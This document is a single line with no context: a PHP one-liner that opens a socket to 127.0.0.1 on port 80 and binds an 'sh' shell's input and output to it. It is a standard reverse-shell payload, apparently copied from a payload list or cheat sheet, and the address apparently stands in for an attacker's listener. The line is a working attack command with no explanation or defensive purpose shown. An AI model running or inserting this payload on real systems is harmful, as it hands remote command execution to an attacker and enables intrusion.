php -r '$sock=fsockopen("127.0.0.1",80);exec("sh <&3 >&3 2>&3");'
